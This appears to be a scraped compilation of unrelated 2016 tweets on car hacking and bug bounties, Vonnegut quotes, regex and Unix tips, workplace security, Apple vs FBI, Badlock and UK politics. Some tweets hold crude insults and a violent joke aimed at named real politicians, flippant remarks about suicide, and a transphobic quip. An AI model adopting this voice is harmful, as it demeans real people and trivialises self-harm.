        Not every car hacking paper ever has to mention our work (or UW/UCSD), but in a 300 page book you think it'd warrant a mention.

        Eight months after the @0xcharlie & @nudehaberdasher Jeep hack POC, the FBI warns us that car #hacking is a threathttp://www.wired.com/2016/03/fbi-warns-car-hacking-real-risk/ ...

        Saw this old article for first time todayhttps://www.yahoo.com/tech/maker-hacked-radio-says-system-unique-fiat-chrysler-191731497--finance.html ... 
        Two interesting things in that article.  1) harman talked about our research on their earnings call and 2) head unit code was 5 years old.

        One of the things I really hate about academic papers is how they always feel the need to describe their work as "novel"
        Read chapter on "attacking ecus" of car hackers handbook. It's all about hardware hacking which is cool because I don't know much about that

        Whatever the FBI pays the 'outside party' to unlock the 5C, Apple w/ $200B in the bank, could pay more. If only they had a bounty program.

        An article in the WSJ says GM has had dozens of submissions to its (non-paid) bug bounty.  I'd love to know the quality of those :)
        I'd pay for a Kickstarter to see old GI Joe episodes except Cobra wins sometimes.
        All I've got to say is FBI got mad computer hacking skills
        Curious if there will be a bunch of car hacking talks at blackhat/defcon this year.  Wonder what the quality will be? I've seen good and bad
        Bravo!http://www.scmagazine.com/ucsd-professor-receives-acm-infosys-foundation-award-for-innovative-research/article/486164/ ... 
        It is incredulous that to get paid in the bug bounty, you have to pass a background checkhttp://www.defense.gov/News-Article-View/Article/710033/hack-the-pentagon-pilot-program-opens-for-registration ... 
        Luckily, all the hackers who can't pass a background check will stop hacking the pentagon because they want to follow the rules.

        It's actually worse than that because the user thinks they're decelerating the cruise while it's locked in place. So unsafe. @mtbarra
        Filed with NHTSA, since Chevrolet won't address it. If this has caused you an accident, please contact me. @mtbarrapic.twitter.com/8OPsPEHnna
        Is there anyone following me who is an engineer at Bosch? I've got several usability / crash bugs that you might want to look into.
        Chevrolet cited their engineers didn't see a problem with the cruise. Possibly the same engineers responsible for their ignition switches?

        She was a dull person, but a sensational invitation to make babies.
        I feel and think much as you do, care about many of the things you care about, althouh most do not care about them. You are not alone.
        Literature should not disappear up its own asshole, so to speak.
        Lovemaking is one of the best ideas Satan put in the apple he gave to Eve. The best idea in that apple, though, is making jazz.
        How complicated and unpredictable the machinery of life really is.
        Beware of the man who works hard to learn something, learns it, and finds himself no wiser than before.
        Smoking is the only honorable form of suicide.
        Peculiar travel suggestions are dancing lessons from God.
        If you want to really hurt your parents, and you don't have the nerve to be gay, the least you can do is go into the arts.
        I was taught that the human brain was the crowning glory of evolution so far, but I think it's a very poor scheme for survival.
        There's only one rule that I know of, babies -- God damn it, you've got to be kind.
        Life happens too fast for you ever to think about it. If you could just persuade people of this, but they insist on amassing information.
        Live by the harmless untruths that make you brave and kind and healthy and happy.
        I wish people who love each other would say to each other, when they fight, "Please-a little less love, and a little more common decency."
        Anyone unable to understand how a useful religion can be founded on lies will not understand my tweets. So be it.
        To me, wanting every habitable planet to be inhabited is like wanting everybody to have athlete's foot.
        Do not use semicolons. They are transvestite hermaphrodites representing absolutely nothing. All they do is show you've been to college
        We are what we pretend to be, so we must be careful what we pretend to be.
        Eat, drink, and be merry, for tomorrow we die.
        The most important message of a crucifix, was how cruel supposedly sane human beings can be when under orders from a superior authority.
        Round and round we spin, with feet of lead and wings of tin.
        I urge you to please notice when you are happy, and exclaim or murmur or think at some point, "If this isn't nice, I don't know what is."
        Our awareness is all that is alive and maybe sacred in any of us. Everything else about us is dead machinery.
        Freedom of speech isn't something somebody else gives you. That's something you give to yourself.
        History is merely a list of surprises. ... It can only prepare us to be surprised yet again.
        No grown woman is a fan of premature ejaculation.
        Extenuating circumstance to be mentioned on Judgment Day: We never asked to be born in the first place.
        I hate H-bombs and the Jerry Springer show.

        Create a diagram of a regular expression http://regexper.com/ 
        Languages have minor variations in their regex support. @RegexTip mostly sticks to the common features of Perl, C#, Python, JavaScript, ...
        * means zero or more occurrences. Ex: /ab*c/ matches 'ac', 'abc', 'abbc', etc.
        ? means a character or expression is optional, i.e. zero or one occurrences. Example: /ab?c/ matches 'ac' and 'abc' but not 'abbc'.
        + means one or more occurrences.  For example, /ab+c/ matches 'abc' or 'abbc' or 'abbbbbbc'.
        A dot matches any single character. For example, /r.de/ matches 'ride', 'rode' etc.
        (Fine print: whether . matches a newline character depends on the implementation and configuration options.)

        .* will match as much as it can, but then backtrack if the next atom can also be matched. Backtracking on some engines is slow.
        The escape character \ makes special characters literal. For example, \. matches a period.
        What we call 'regular expressions' today includes more general patterns than the original definition from the 1950's.
        The characters * and ? have different meanings in regular expressions than they do in shells. Confusingly similar, but different.
        @RegexTip I forgot this was possible on a german car license plate. pic.twitter.com/mWmYqd108O
        Character classes are characters listed inside square brackets.  For example, [aeiou] is a character class that matches any vowel.
        Very important to keep in mind: different rules apply inside versus outside character classes.
        Inside a character class, dash means range. For example, [0-9] matches any digit. Outside a character class dash has no special meaning.

        Yay for the generic transfer_one_message in Linux's spi layer: @ 50 MHz cpu clock, it spends 10% of SPI I/O time recording useless stats.
        Simply C&P'ing it to the J-core SPI driver and removing all the accounting & crap boosted transfer speeds by 10%.

        Don't be fooled by Ghost in the Shell being from 1995.

        @SwiftOnSecurity our production server was named pastrami
        @SwiftOnSecurity I once had a dev server named "shitbrick." It was involved in a lawsuit later. That was a fun deposition.
        Working in defence recently has given me the insight that companies care much less if they get owned than offence thinks they do.
        Our epitaph as a civilization will read: "They adopted USB as a universal charging port."
        .@semibogan This is why I've pivoted so hard to easy, cheap wins for security. Fight the business once you have even the silent basics done.
        .@semibogan The narrative of every company needing a 5 person security team or they might as well not even attempt is severely fucked up.
        In an industry of people who feel like imposters, putting security as an unattainable super-effort is incredibly counter-productive.
        If I can do decent security with some stupid group policy, batch files, and crappy tools I barely get purchase approval for, there's hope.
        .@_devonkerr_ @semibogan Its a lot easier to delegate security to a box than listen to junior IT people on the ground floor who see and care
        If you're in a company on the ground floor and you think nobody cares, fuck em, just start doing stuff. They didn't care when I took over.
        I took over Group Policy, patching, AD monitoring, antivirus, desktop security when I was in helpdesk.
        @SwiftOnSecurity I advanced in every tech department by documenting & streamlining procedure, mostly for my personal convenience.
        .@SwiftOnSecurity a bias for action is what distinguishes workhorses from show horses ...
        I thought we didn't do security because nobody cared. No, all I had to do was speak up and offer real solutions instead of just complaining.
        Having intimate knowledge of user workflows is an incredible asset in security. You know exactly how to tune things without annoying users.

        The name 'awk' comes from the initials of its creators: Aho, Weinberger, and Kernighan

        Output a file, displaying non-printing characters: cat -v
        Kill a line in Emacs from anywhere on that line: M-shift-backspace
        Sort a file in case-insensitive order: sort -f. 'f' for 'fold,' i.e. fold upper and lower case together
        The sed command p prints. For example, print lines 3 through 7 of a file: sed -n '3,7p' somefile
        Show how many times each line in a sorted file is repeated: uniq -c
        Perl has a utility a2p to convert awk scripts into perl scripts.

        The "hackers and criminals will abuse" argument against FBiOS feels the least genuine.

        I'll replace CUDA with OpenCL, mainly because CUDA lacks a JIT compiler. Some algorithms will run slower, some will run faster.

        Apple stopped signing iOS 9.3 / you know what that means
        No! The word is: "verschlimmbesserung"https://twitter.com/uberfacts/status/722179663385214977 ... 

        I guess I need a vacation ... I dreamed @RomanAtwood attended @reconmtl

        How about every con reporting how few submissions from women (0,1,2) they got. Would put a stop to the myth that women get auto rejected
        For most cons (as I was told by their CFP guys) a single accepted female speaker is already way better odds than a random talk selection
        Okay so I cannot go to Starbucks to get a coffee because the Starbucks iPhone app does not accept my password.
        I would expect that if you release an iOS app that allows paying in your stores you made pretty damn sure that it can be used @Starbucks
        Ohh I remember the solution: the Starbucks app asks for email address/password but actually wants username/password

        Just because an attack is basic doesn't mean it's not a sophisticated actor. Some of the best adversaries do only the bare minimum required

        Bottom line: As a trained engineer, it just took me 30 minutes longer to turn on the lights than everyone else.
        Also, once the lamp was on, I read the sign under the lamp that said "remember to turn on switch by door".

        When you testify in congress, they give you a nice goody-bag full of swag in the green room. #ThingsThatAreNotTrue.
        Given the state of net security, debating whether crypto should be legal feels like debating whether fire hydrants are an unsightly blight.
        I was blown away by the law enforcement witness's inability to identify even a single way modern smartphones aid investigations.

        FDR was 3x wealthier than the Clintons and more way more hawkish, but BernieBros are suddenly yearning for FDR's liberalism. FUBAR.
        @JeffersonObama These same bros who laugh about "Monica" ignore that FDR had a mistress and refused to divorce Eleanor because of politics.
        @JeffersonObama FDR also chose not to nationalize banks, but to regulate them

        Hamilton should probably be moved to the $100 bill or to a new higher denomination bill that ordinary people use very rarely.
        Shouldn't Jackson fans be happy that he is no longer going to be identified with the sort of central banking he warred against?
        As much as I dislike him, Hamilton should be on a dollar denomination. He created the dollar. The anomaly is Ben Franklin.

        I'm pretty satisfied with those @oss_announce and @foss_security bots. Twitter's a better notification medium than YAM (Yet Another Mail).
        Of course behind the scenes it's all email. About 4.000-5.000 received mails per day, to be precise.
        But my advanced AI (one regex) and advanced algoritms (a 2-line PHP script) keep the magic flowing:
        Also, let's be honest: being a Linux sysadmin is half writing clever regex's and half writing scripts to glue them together.

        I've been thinking about starting a podcast lately, but can't decide on the topic: dev- or ops-focussed? Both? Or is that market saturated?

        If you discuss the contents of employee exit interviews publicly, your employees will not be honest with you in exit interviews.

        Disclosing the contents of exit interviews in an industry that commonly forces people to sign NDAs on the way out is, uh, a problem.

        Brexit policy document: "Upon taking our leave of the Union, we shall travel on horseback a great distance to consult a mighty oracle."
        "This oracle shall proclaim at great length and little detail the future of our Great Britain and the mythical 'Trade Agreements'."

        Theresa May's top demands: to leave the European Convention on Human Rights; to be Princess of Yoghurt.
        Today's bus driver looks like a man who would have a finger missing.
        Theresa May is a fucking idiot.
        Jeremy Hunt is a fucking idiot.
        And so on.
        Tory ministers are queueing up to spout ill-informed shit. "I want the UK to move to Japan but still remain in Europe," Theresa May babbles.
        "I think the Pope should be in charge of unions," says Jeremy Hunt. "And junior doctors should be sent to the East Anglian Medicine Mines."
        "I want to enslave all of humanity!" Theresa May says with an evil cackle. "But still remain in Europe."
        Well done to the Tory shits who couldn't bear the thought of sharing their poxy island with 3000 foreign children.
        When I'm grand munificent overlord of Earth, all tory MPs will have their genitals slammed in a car door once an hour for eternity.

        It's almost as if aligning a group of people under one political banner and expecting them to have exactly the same opinion is impractical.
        That said, Ken Livingstone is a fatuous wanker at the best of times.
        Ken Livingstone: "I didn't say I didn't not disagree with Hitler, what I clearly said isn't that Hitler wasn't unlike not didn't agree jew."
        Ken Livingstone pictured earlier today.pic.twitter.com/n9POUqg2pm
        Ken Livingstone: "To clarify my earlier remarks I love Hitler shit no I mean objectively he had a nice arse I mean he wasn't all bad oh fu... "
        No-one has ever been suspended from the Labour party while hiding in a disabled toilet so statistically Ken should be okay.
        Oh well, that's statistics for you.
        I'm willing to bet that at this point Boris Johnson literally can't stop masturbating.
        LIVE NOW: UK PM David Cameron campaigns for Britain to remain in the EU while laughing hysterically.
        What Jeremy Corbyn needs to do right now before this gets completely out of hand is hide in a cupboard for the rest of his life.
        I do think it's a brave move by Labour to try to emulate the success of the Lib-Dems.
        Once again Hitler wrecks someone's career. The man's a menace.
        "Ken Livingstone's lucky he's only been suspended from the Labour party. I was suspended from a petrol station." -- Mussolini

        For a technical opposition view to Apple's claims in their filing, see https://twitter.com/pwnallthethings/with_replies ... 
        If Apple gets to call #FBiOS a "backdoor", I suggest we refer to "Apple updates" as "official backdoor only good guys are allowed to use"
        @daviottenheimer it's all bluster. Apple not only has a master key for all iPhones (signing key) they also have a backdoor on them (updates)
        Remember: *all* of the worst case dangers of #FBiOS are a *strict* subset of dangers of Apple's existing signing keys leaking #AppleVsFBI

        #badlock is DDOS and mitm... At first glance, doesn't match the hype
        It's an official cry wolf then.https://twitter.com/bugch3ck/status/719925028528242688 ... 
        I will be kind and say that I am underwhelmed thus far.  mITM and DOS.  Few deets.... #badlock
        Man-in-The-Middle? Are you kidding me.... that is all we get out of #BadLock ? No remote code exec?
        .@johullrich  which, coincidentally you could already do with smb relaying...
        Functionality that has existed for years has a much larger impact. Pth, mimikatz, SMB relays, etc etc
        In other news, we have figured out the pwnie award winner for 2016 for "most overhyped bug" and possibly "lamest vendor response" #badlock
        so #badlock seems to be ms16-047. claims privesc / access to SAM, so there might be something worth digging into, but still meh
        @SushiDude 
        nobody will ever be able to top this burn. twitter is overhttps://twitter.com/clmazin/status/720259227067920385 ... 
        SHOT THROUGH THE HEART AND YOU'RE TO BLAME. YOU GAVE BADLOCK A BAD NAME. @SerNet
        Random rant:
        1) I'm not comfortable with the amount of callouts to MS that I feel comfortable introducing it into a customer network
        2) the amount of unfscking that needs to be done to make it usable for attack purposes seems very high
        3) It's just so much easier to use win 7 rather than deal with all the extra crap with win 10....
        Somebody tell me why I'm wrong...
        .@jepayneMSFT eliminating all the things that prevents me from doing 'bad stuff' on your network ;-)
        . @jepayneMSFT gaining a full understanding of whatever telemetry is being sent to MS and disabling as much as humanly possible
        .@jepayneMSFT as an attacker, I have attack tools... to you know, attack the network and stuff (with permission of course)
        This is america the answer is always yes.https://twitter.com/pfunk270/status/720327156123852801 ... 
        Dildos should be addressed to:
        . @jepayneMSFT Win 7 is much easier to delouse than win 10.
        . @jepayneMSFT it might be easier to go with a server os than than win10...
        .@kennwhite @jepayneMSFT I shouldn't need to introduce a hw firewall to use a VM on the network :/
        .@jepayneMSFT indeed.  like I said, making it easier on me is the reason I have an attack platform
        .@JakobHeidelberg @jepayneMSFT All MS needs to do is provide a list and why I should allow it ;-)
        @donttrythis are you concerned future WH science fairs could possibly limit participation to children that can be build really good walls?
        .@JakobHeidelberg @jepayneMSFT I'd settle for a rules manager not designed to be mass admin'd by GPO
        Instead of spending the time and money to thoughtfully design and implement a secure system, just slap a lock icon on the home page.
        that feeling when you build something and you realize it could be much cooler than you originally thought

        I think the security software industry is in denial, it's going to take a few $1B worms before they even acknowledge there's a problem.
        No response from Comodo yet. Let's hope they're not just going to leave everyone vulnerable until the 90day clock runs out. #wtf #antivirus
        One example: do you think that Sophos learnt anything after @taviso 's sophail plethora of vulns? Think again.
